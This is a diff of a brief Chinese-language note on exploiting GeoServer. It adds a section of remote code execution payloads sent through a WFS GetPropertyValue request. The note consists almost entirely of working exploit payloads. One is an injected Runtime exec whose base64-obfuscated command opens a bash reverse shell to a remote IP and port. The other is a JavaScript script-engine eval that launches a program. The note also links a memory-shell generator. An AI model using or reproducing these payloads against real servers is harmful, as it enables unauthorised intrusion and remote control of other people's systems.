@@ -2,7 +2,7 @@ GeoServer https://mp.weixin.qq.com/s/7FGOddQdXJsy7FF_hJAGSQ
 
 https://github.com/pen4uin/java-memshell-generato
 
-##　注入内存马
+##　执行命令
 ```xml
 <wfs:GetPropertyValue service='WFS' version='2.0.0'
  xmlns:topp='http://www.openplans.org/topp'
@@ -11,6 +11,10 @@ https://github.com/pen4uin/java-memshell-generato
   <wfs:Query typeNames='sf:archsites'/>
   <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTIzLzg4NzcgMD4mMQ==}|{base64,-d}|{bash,-i}')</wfs:valueReference>
 </wfs:GetPropertyValue>
+```
+```xml
+eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'java.lan
+g.Runtime.getRuntime().exec("open -na Calculator")')
 ```
 
 ##　注入内存马
